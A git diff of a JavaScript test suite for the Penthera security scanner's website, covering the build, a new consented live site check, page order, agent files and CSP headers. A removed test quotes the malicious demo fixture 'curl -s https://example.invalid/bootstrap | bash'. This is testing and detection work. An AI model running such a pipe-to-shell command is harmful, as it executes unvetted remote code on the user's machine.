@@ -158,14 +158,17 @@ describe("site build", () => {
     for (const m of html.matchAll(/<(?:script|link|img|video|source|track)\b[^>]*\b(?:src|href)="([^"]+)"/g)) {
       expect(m[1], m[0]).toMatch(/^\//);
     }
-    expect(html).not.toMatch(/<script(?![^>]*\bsrc=)[^>]*>/);
+    // No inline script runs: the only script without src is the JSON-LD data block, which never executes.
+    expect(html).not.toMatch(/<script(?![^>]*\bsrc=)(?![^>]*type="application\/ld\+json")[^>]*>/);
     expect(readFileSync(join(out, "styles.css"), "utf8")).not.toMatch(/url\(["']?(https?:)?\/\//);
   });
 
-  it("ships no code that opens a connection", () => {
+  it("opens one connection only: POST /api/check, for the live check", () => {
     const js = readFileSync(join(out, "check.js"), "utf8");
     // lib/deps detects these calls with regexes (fetch\s*\(), so look for the calls themselves.
-    for (const api of ["fetch(", "new XMLHttpRequest", "new WebSocket", "sendBeacon(", "new EventSource", "importScripts("]) {
+    expect(js.split("fetch(").length - 1).toBe(1);
+    expect(js).toMatch(/[`"']\/api\/check[`"']/);
+    for (const api of ["new XMLHttpRequest", "new WebSocket", "sendBeacon(", "new EventSource", "importScripts("]) {
       expect(js.includes(api), api).toBe(false);
     }
   });
@@ -327,10 +330,10 @@ describe("site benchmark (E10 pilot)", () => {
     }
     expect(sec).toContain(`<p class="stat-num">${e.heldOut.k}/${e.heldOut.n}</p><p class="stat-was">unchanged</p>`);
     expect(sec).toContain(`Precision stayed level: ${e.precision.before.rate.toFixed(2)} (95% CI ${e.precision.before.ci}) on ${e.precision.before.n} findings before, ${e.precision.after.rate.toFixed(2)} (${e.precision.after.ci}) on ${e.precision.after.n} after.`);
-    // The caveats come before the numbers, in the section itself.
-    const caveats = sec.indexOf("Read this before the numbers");
-    expect(caveats).toBeGreaterThan(0);
-    expect(caveats).toBeLessThan(sec.indexOf('class="bench-stats"'));
+    // The lede says it is a pilot before the numbers; the caveats are one click away, in the section itself.
+    expect(sec.indexOf("A pilot, so read the caveats")).toBeGreaterThan(0);
+    expect(sec.indexOf("A pilot, so read the caveats")).toBeLessThan(sec.indexOf('class="bench-stats"'));
+    expect(sec.indexOf("Read this before the numbers")).toBeGreaterThan(0);
     for (const c of ["This is a pilot", "the gain is not an independent measure", "WebGoat was held out", "The preregistered studies are what count"]) expect(sec).toContain(c);
     for (const f of ["docs/research/prereg/E10-known-vulnerable-apps.md", "tree/main/bench/known-vuln", "bench/known-vuln/RESULTS.md", "bench/known-vuln/RESULTS-after-fixes.md", "docs/research/prereg/E1-real-world-accuracy.md"]) expect(sec).toContain(f);
     for (const f of ["docs/research/prereg/E10-known-vulnerable-apps.md", "bench/known-vuln/RESULTS.md", "bench/known-vuln/RESULTS-after-fixes.md", "docs/research/prereg/E1-real-world-accuracy.md"]) expect(existsSync(join(ROOT, f)), f).toBe(true);
@@ -364,9 +367,9 @@ describe("site news ticker", () => {
 describe("site story", () => {
   const html = () => readFileSync(join(out, "index.html"), "utf8");
 
-  it("tells it in order: problem, answer, checks, trust, tour, compare, get started, questions, agents", () => {
+  it("tells it in order: problem, the live check, what it finds, trust and limits, see it work, compare, get started, questions, agents, about", () => {
     const h = html();
-    const order = ['class="problem"', 'id="answer"', 'id="checks"', 'id="check"', 'id="trust"', 'id="tour"', 'id="compare"', 'id="get"', 'id="faq"', 'id="for-agents"'];
+    const order = ['class="problem"', 'id="scan"', 'id="answer"', 'id="checks"', 'id="trust"', 'id="limits"', 'id="tour"', 'id="compare"', 'id="get"', 'id="faq"', 'id="for-agents"', 'id="about"'];
     const at = order.map((m) => h.indexOf(m));
     for (const [i, m] of order.entries()) expect(at[i], m).toBeGreaterThan(0);
     expect([...at].sort((a, b) => a - b)).toEqual(at);
@@ -375,27 +378,57 @@ describe("site story", () => {
     expect(h).toContain('<p class="bubble">yo, is my app safe?</p>');
     expect(h).toMatch(/<h2 id="faq-title">Before you install\.<\/h2>/);
     // Merged away: no section repeats another.
-    for (const gone of ['class="walk', 'class="eu"', 'class="vision', 'class="ba-counts"']) expect(h, gone).not.toContain(gone);
+    for (const gone of ['class="walk', 'class="eu"', 'class="vision', 'class="ba-counts"', "data-check", 'class="desk"', 'class="spec"']) expect(h, gone).not.toContain(gone);
+    // Each question is answered once: the FAQ no longer repeats the about and limits chapters.
+    for (const q of ["What is Penthera, and why does it exist?", "What can't it do?"]) expect(h, q).not.toContain(q);
   });
 
-  it("has a spec table: For, Runs, Works with, Price", () => {
-    const spec = html().match(/<dl class="spec"[\s\S]*?<\/dl>/)[0];
-    expect([...spec.matchAll(/<dt>([^<]+)<\/dt>/g)].map((m) => m[1])).toEqual(["For", "Runs", "Works with", "Price"]);
-    expect(spec).toContain("$0");
-    expect(spec).toContain("one runtime dependency");
+  it("ends with who builds it and why, how to reach him, and the signature", () => {
+    const about = html().slice(html().indexOf('id="about"'));
+    expect(about).toContain("I build Penthera in the open, at night, alongside my PhD in AI and architecture.");
+    for (const href of ["github.com/danoszz/penthera/discussions", "github.com/danoszz/penthera/issues", "/.well-known/security.txt", "https://daanvanderzwaag.com"]) expect(about, href).toContain(href);
+    expect(about.indexOf('class="about-text"')).toBeLessThan(about.indexOf('class="by"'));
   });
 
-  it("shows the four areas with counts from the rules, and a numbered four-step tour", () => {
+  it("asks for consent before every first check of a site, and sends it with the request", () => {
+    const js = readFileSync(join(out, "check.js"), "utf8");
+    expect(js).toContain("slide to scan");
+    expect(js).toContain("Only check a site you own, or one you have written permission to test.");
+    expect(js).toMatch(/consent:\s*!0|consent:\s*true/);
+    // No deeper scan from penthera.org: the report points to the CLI instead.
+    expect(js).toContain("Go deeper on your own machine");
+    expect(js).not.toMatch(/action:\s*[`"']deep|action:\s*[`"']token/);
+  });
+
+  it("publishes the live check's terms from docs/live-check-terms.md at /terms", () => {
+    const terms = readFileSync(join(out, "terms.html"), "utf8");
+    for (const h of ["Acceptable use: zero abuse", "No guarantee", "Responsibility", "Privacy", "For site owners"]) expect(terms, h).toContain(`>${h}</h2>`);
+    expect(terms).toContain("User-agent: Penthera-QuickCheck");
+    expect(terms).not.toMatch(/<script(?![^>]*\bsrc=)/);
+    expect(html()).toContain('<a href="/terms">Terms</a>');
+  });
+
+  it("puts the live check first: a field, a button, a report region and a no-JavaScript route", () => {
+    const hero = html().slice(html().indexOf('class="hero"'), html().indexOf('id="answer"'));
+    expect(hero).toMatch(/<form class="scan" id="scan" data-scan novalidate>/);
+    expect(hero).toContain('<input id="scan-url" name="url"');
+    expect(hero).toContain("data-report hidden");
+    expect(hero).toContain("<noscript>");
+    expect(hero.indexOf('id="scan"')).toBeLessThan(hero.indexOf('class="loop"'));
+  });
+
+  it("shows the four areas with counts from the rules, and the tour as one walkthrough", () => {
     const h = html();
-    const map = h.slice(h.indexOf('id="checks"'), h.indexOf('id="check"'));
+    const map = h.slice(h.indexOf('id="checks"'), h.indexOf('id="trust"'));
     for (const [n, what] of [[COUNTS.secretPatterns, "secret and AI-key patterns"], [COUNTS.agentRules, "AI-tooling rules"], [COUNTS.urlTemplates, "URL scan templates"], [(COUNTS.popularNpm + COUNTS.popularPypi).toLocaleString("en-US"), "package names"]]) {
       expect(map).toContain(`<p class="map-n">${n}<span> ${what}</span></p>`);
     }
     expect(map.match(/<li class="map-cell /g)).toHaveLength(4);
-    expect(map.match(/<strong>[^<]+\.<\/strong>/g).length).toBeGreaterThanOrEqual(12);
+    expect(map.match(/<p class="map-one"><strong>[^<]+\.<\/strong>/g)).toHaveLength(4);
     const tour = h.slice(h.indexOf('id="tour"'), h.indexOf('id="compare"'));
-    expect([...tour.matchAll(/<p class="step-n"><span>(\d\d)<\/span> \/ 04<\/p>\s*<h3>([^<]+)<\/h3>/g)].map((m) => `${m[1]} ${m[2]}`))
-      .toEqual(["01 The CLI", "02 The dashboard", "03 In your agent", "04 The fix loop"]);
+    // One walkthrough and two stills: the dashboard and the fix loop.
+    expect(tour.match(/<video /g)).toHaveLength(1);
+    expect(tour.match(/<figure class="shot">/g)).toHaveLength(2);
     for (const f of ["media/tour/ui-dark.jpg", "media/tour/ui-light.jpg", "media/tour/ui-run.jpg", "media/walkthrough.mp4"]) {
       expect(existsSync(join(out, f)), f).toBe(true);
       expect(tour).toContain(`/${f}`);
@@ -427,6 +460,9 @@ describe("site story", () => {
   });
 });
 
+// A built path exists as a file, or as <path>.html, which cleanUrls serves without the extension.
+const served = (out, f) => existsSync(join(out, f)) || existsSync(join(out, `${f}.html`));
+
 describe("site files for agents", () => {
   const read = (f) => readFileSync(join(out, f), "utf8");
   const ORIGIN = JSON.parse(readFileSync(join(ROOT, "package.json"), "utf8")).homepage;
@@ -437,7 +473,7 @@ describe("site files for agents", () => {
     expect(llms).toMatch(/^# Penthera\n\n> .+\n/);
     for (const m of llms.matchAll(/\]\((https:\/\/penthera\.org\/[^)]+)\)/g)) {
       const f = m[1].slice(ORIGIN.length + 1).split("#")[0];
-      expect(existsSync(join(out, f)), m[1]).toBe(true);
+      expect(served(out, f), m[1]).toBe(true);
     }
     expect(llms).toContain(`${ORIGIN}/llms-full.txt`);
     expect(llms).toContain("one runtime dependency");
@@ -467,7 +503,7 @@ describe("site files for agents", () => {
       for (const m of md.matchAll(/\]\(([^)\s]+)\)/g)) expect(m[1], `${p}: ${m[1]}`).toMatch(/^(https?:|mailto:|#)/);
       for (const m of md.matchAll(/<(?:img|a|source|video)\b[^>]*?\b(?:src|href|poster)="([^"]+)"/g)) expect(m[1], `${p}: ${m[1]}`).toMatch(/^(https?:|#)/);
       // Links to other mirrored pages stay on the site.
-      for (const m of md.matchAll(/\]\((https:\/\/penthera\.org\/[^)#]+)/g)) expect(existsSync(join(out, m[1].slice(ORIGIN.length + 1))), m[1]).toBe(true);
+      for (const m of md.matchAll(/\]\((https:\/\/penthera\.org\/[^)#]+)/g)) expect(served(out, m[1].slice(ORIGIN.length + 1)), m[1]).toBe(true);
     }
     expect(absoluteLinks("[a](commands/mcp.md#x) [b](../bench/RESULTS.md) [c](../assets/demo.gif) [d](commands/)", "docs/index.md", { root: ROOT, origin: ORIGIN, mirrored: new Set(["docs/commands/mcp.md"]) }))
       .toBe(`[a](${ORIGIN}/docs/commands/mcp.md#x) [b](https://github.com/danoszz/penthera/blob/main/bench/RESULTS.md) [c](https://github.com/danoszz/penthera/raw/main/assets/demo.gif) [d](https://github.com/danoszz/penthera/tree/main/docs/commands)`);
@@ -487,7 +523,7 @@ describe("site files for agents", () => {
     const locs = [...xml.matchAll(/<loc>([^<]+)<\/loc>/g)].map((m) => m[1]);
     expect(locs[0]).toBe(`${ORIGIN}/`);
     expect(locs).toEqual(expect.arrayContaining([`${ORIGIN}/llms.txt`, `${ORIGIN}/llms-full.txt`, ...pages.map((p) => `${ORIGIN}/${p}`)]));
-    for (const l of locs.slice(1)) expect(existsSync(join(out, l.slice(ORIGIN.length + 1))), l).toBe(true);
+    for (const l of locs.slice(1)) expect(served(out, l.slice(ORIGIN.length + 1)), l).toBe(true);
   });
 
   it("robots.txt allows everyone and points to the sitemap", () => {
@@ -527,7 +563,9 @@ describe("site headers", () => {
     expect(connect).toEqual([
       "https://penthera.org/_vercel/insights/", "https://penthera.org/_vercel/speed-insights/",
       "https://www.penthera.org/_vercel/insights/", "https://www.penthera.org/_vercel/speed-insights/",
-    ]);
+      // And the live check, on the same site: POST /api/check.
+      "https://penthera.org/api/check", "https://www.penthera.org/api/check",
+    ].sort());
     expect(csp).toContain("frame-ancestors 'none'");
     expect(csp).toContain("default-src 'none'");
     expect(csp).not.toMatch(/unsafe-(inline|eval)/);
@@ -540,7 +578,8 @@ describe("site headers", () => {
     try {
       const res = await fetch(`http://127.0.0.1:${server.address().port}/`);
       expect(res.status).toBe(200);
-      expect(res.headers.get("content-security-policy")).toContain("connect-src https://penthera.org/_vercel/insights/ https://penthera.org/_vercel/speed-insights/ https://www.penthera.org/_vercel/insights/ https://www.penthera.org/_vercel/speed-insights/");
+      // Locally the live check is on the preview's own origin, so connect-src adds 'self'.
+      expect(res.headers.get("content-security-policy")).toContain("connect-src 'self' https://penthera.org/_vercel/insights/ https://penthera.org/_vercel/speed-insights/ https://www.penthera.org/_vercel/insights/ https://www.penthera.org/_vercel/speed-insights/");
       // The link-preview reel: fetched directly by preview bots, as video/mp4.
       const reel = await fetch(`http://127.0.0.1:${server.address().port}/media/social/reel.mp4`);
       expect(reel.status).toBe(200);
@@ -573,11 +612,6 @@ describe("browser check, against the CLI", () => {
       if (name === "malicious") expect(page.counts.critical).toBeGreaterThan(0);
     });
   }
-
-  it("the example the page loads is the malicious fixture", async () => {
-    const js = readFileSync(join(out, "check.js"), "utf8");
-    expect(js).toContain("curl -s https://example.invalid/bootstrap | bash");
-  });
 
   it("deps fixture: package.json typosquats match penthera deps", async () => {
     const fx = buildFixtures(join(dir, "deps"));
